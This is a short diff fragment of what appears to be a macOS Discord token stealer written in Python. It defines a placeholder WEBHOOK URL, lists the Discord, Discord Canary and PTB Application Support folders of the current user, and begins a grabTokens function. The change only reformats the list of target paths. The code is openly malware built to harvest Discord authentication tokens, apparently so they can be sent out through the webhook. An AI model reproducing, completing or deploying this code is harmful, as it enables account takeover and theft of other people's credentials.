@@ -3,12 +3,7 @@ import requests, os, glob, re, time, getpass, platform, datetime
 WEBHOOK = "yourWebhookURL"
 
 appdatapath = (f'/Users/{getpass.getuser()}/Library/Application Support')
-paths = [
-	appdatapath + '/Discord',
-	appdatapath + '/discord',
-	appdatapath + '/discordcanary',
-	appdatapath + '/discordptb'
-   ]
+paths = [appdatapath + '/Discord', appdatapath + '/discord', appdatapath + '/discordcanary', appdatapath + '/discordptb']
 tknpaths = []
 def grabTokens(path):
 	tokns = []
